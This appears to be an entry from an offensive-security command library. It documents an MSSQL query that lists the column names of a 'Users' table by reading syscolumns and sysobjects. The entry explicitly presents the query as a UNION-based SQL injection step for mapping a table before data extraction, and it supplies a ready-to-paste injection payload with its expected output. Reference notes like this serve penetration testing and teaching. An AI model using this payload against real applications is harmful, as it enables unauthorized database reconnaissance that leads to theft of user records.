---
type: command
executor: sql
data: >-
  SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name =
  'Users')
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Windows
tags:
  - sql-injection
  - discovery
verified: true
validated: true
---

# MSSQL Select Columns from Users Table

## Command

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
```

## Description

This subquery joins syscolumns and sysobjects to retrieve column names for the 'Users' table. Use in UNION injection to map table structure before data extraction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| name | Column for column names | Yes |
| syscolumns | System view for column metadata | Built-in |
| id = (SELECT id FROM sysobjects WHERE name = 'Users') | Subquery to get table ID | Yes |

## Examples

### Basic Usage

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
```

### In Injection Context

' UNION SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')--

## Expected Output

UserId
UserName

Reveals columns; adjust table name for others.

## Related

- [[procedures/mssql-union-based-injection-for-database-enumeration]]
- [[commands/mssql-select-tables-from-injection-db]]
